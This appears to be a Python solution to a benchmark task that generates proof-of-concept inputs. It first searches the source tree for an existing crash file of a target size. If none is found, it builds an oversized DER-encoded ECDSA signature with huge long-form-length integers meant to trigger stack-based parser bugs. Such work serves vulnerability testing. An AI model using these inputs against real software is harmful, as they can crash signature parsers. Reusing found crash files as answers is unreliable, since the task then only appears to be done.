import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_size = 41798
        poc = self._find_existing_poc(src_path, target_size)
        if poc is not None:
            return poc
        return self._build_der_sig(target_size)

    def _find_existing_poc(self, src_path: str, target_size: int) -> bytes | None:
        best_poc = None
        best_size = -1

        for root, _, files in os.walk(src_path):
            for name in files:
                path = os.path.join(root, name)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                # Perfect match on size
                if size == target_size:
                    try:
                        with open(path, "rb") as f:
                            return f.read()
                    except OSError:
                        pass
                    continue

                # Heuristic: look for likely PoC/crash files
                lower = name.lower()
                if any(k in lower for k in ("poc", "crash", "id_", "seed", "input")):
                    if size > best_size and size <= 1_000_000:
                        try:
                            with open(path, "rb") as f:
                                data = f.read()
                        except OSError:
                            continue
                        best_poc = data
                        best_size = size

        return best_poc

    def _build_der_sig(self, total_len: int) -> bytes:
        # Build a DER-encoded ECDSA signature:
        # SEQUENCE {
        #   r INTEGER (very large, thousands of bytes),
        #   s INTEGER (very large)
        # }
        #
        # Using long-form lengths to make the integers huge, which is likely
        # to hit stack-based parsing bugs.

        if total_len < 10:
            return b"\x30\x00"

        # total_len = 1(tag) + 1(0x82) + 2(seq_len) + seq_len
        seq_len = total_len - 4
        if seq_len <= 8:
            # Not enough to hold two INTEGERs with long-form lengths; fallback small.
            seq_len = total_len - 2
            ba = bytearray(total_len)
            ba[0] = 0x30
            ba[1] = seq_len
            for i in range(2, total_len):
                ba[i] = 0x00
            return bytes(ba)

        # Two INTEGERs: each "0x02 0x82 <len-hi> <len-lo> <len bytes>"
        # seq_len = (4 + M1) + (4 + M2) = M1 + M2 + 8
        # Choose M1 and M2 roughly equal.
        m_total = seq_len - 8
        if m_total < 2:
            m1 = 1
            m2 = 1
        else:
            m1 = m_total // 2
            m2 = m_total - m1

        ba = bytearray(total_len)

        # SEQUENCE header
        ba[0] = 0x30
        ba[1] = 0x82
        ba[2] = (seq_len >> 8) & 0xFF
        ba[3] = seq_len & 0xFF

        # First INTEGER (r)
        ba[4] = 0x02
        ba[5] = 0x82
        ba[6] = (m1 >> 8) & 0xFF
        ba[7] = m1 & 0xFF

        start_r = 8
        end_r = start_r + m1
        if end_r > total_len:
            end_r = total_len
        # Fill with 0x01 so MSB is 0 and the integer stays positive
        ba[start_r:end_r] = b"\x01" * (end_r - start_r)

        # Second INTEGER (s)
        start_s_header = end_r
        if start_s_header + 4 > total_len:
            # Not enough room, just truncate with zeros
            for i in range(start_s_header, total_len):
                ba[i] = 0
            return bytes(ba)

        ba[start_s_header] = 0x02
        ba[start_s_header + 1] = 0x82
        ba[start_s_header + 2] = (m2 >> 8) & 0xFF
        ba[start_s_header + 3] = m2 & 0xFF

        start_s = start_s_header + 4
        end_s = start_s + m2
        if end_s > total_len:
            end_s = total_len
        ba[start_s:end_s] = b"\x01" * (end_s - start_s)

        # If there's any remaining space (due to rounding), fill with zeros.
        if end_s < total_len:
            ba[end_s:] = b"\x00" * (total_len - end_s)

        return bytes(ba)